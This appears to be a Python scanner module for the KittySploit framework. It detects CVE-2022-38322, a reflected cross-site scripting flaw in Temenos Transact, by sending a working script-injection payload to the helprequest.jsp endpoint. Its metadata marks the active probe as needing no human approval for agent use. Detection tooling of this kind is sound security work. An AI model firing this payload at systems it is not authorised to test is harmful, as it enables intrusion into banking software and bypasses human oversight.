#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple vulnerabilities in Temenos Transact (formerly T24) that allows multiple reflected cross-site scriptin."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Temenos Transact - Cross-Site Scripting Detection',
        'description': 'Multiple vulnerabilities in Temenos Transact (formerly T24) that allows multiple reflected cross-site scripting (XSS) attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'temenos', 'transact', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.qotoz.com/posts/Temenos-Transact-XSS-CVE/'],
        'cve': 'CVE-2022-38322',
    }

    def run(self):
        path = '/jsps/helprequest.jsp?url=%27)%22+onerror=%22confirm(%27document.domain%27)%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ('setupHelp(\'\')" onerror="confirm(\'document.domain\')',)
        ctype_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='Temenos Transact - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

